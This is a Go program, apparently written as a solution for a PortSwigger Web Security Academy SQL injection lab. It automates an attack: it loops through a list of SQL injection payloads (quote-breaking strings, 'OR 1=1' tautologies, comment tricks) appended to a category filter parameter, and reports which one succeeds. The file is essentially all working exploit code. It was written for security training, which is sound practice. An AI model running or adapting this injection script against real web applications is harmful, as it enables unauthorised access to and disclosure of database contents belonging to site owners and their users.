/*
	Author: Xavier Llauca aka (@xllauca)
	Author's website: https://xavierllauca.com/
	Url Lab: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
*/

package main

import (
	"flag"
	"fmt"
	"os"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"net/url"
)

func EncodeParam(s string) string {
    return url.QueryEscape(s)
}


func usage() {
    fmt.Fprintf(os.Stderr, "\nUsage: %s https://acf61fa11e0831d6c0e6057200b6002b.web-security-academy.net/", os.Args[0]);
    flag.PrintDefaults(); os.Exit(2);
}

func exploit_Sqlinjection (url string){

	uri := "filter?category=Gifts";
	substr := "Congratulations"
	payloads := []string{"'", "\"", "`","')","\")","-x()", "'OR''='","' OR '1'='1", "')"," OR 1=1","' OR 1=1","1/*!1111'*/","1/*'*/"}

	for _, payload := range payloads {
		resp, err := http.Get(url+uri+EncodeParam(payload)+"--")
		if err != nil {
		   log.Fatalln(err)
		}
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
		   log.Fatalln(err)
		}
		if strings.Contains(string(body), substr){
			fmt.Printf("\n[+] SQL Injection Successful!\n")
			fmt.Printf("\n[*] Payload Used:\n"+url+uri+payload+"--")
			resp.Body.Close()
			break // break here
		} else {
			fmt.Printf("\n[-] SQL Injection Unsuccessful\n")
		}
		resp.Body.Close()
	}
}

func main() {
	flag.Usage = usage; flag.Parse();
    values := flag.Args()

    if len(values)  < 1 {
        fmt.Println("\nSome parameters are missing!");
		fmt.Println("Usage: " + os.Args[0] + "https://acf61fa11e0831d6c0e6057200b6002b.web-security-academy.net/");
        os.Exit(1);
    }
   exploit_Sqlinjection(os.Args[1]);
}
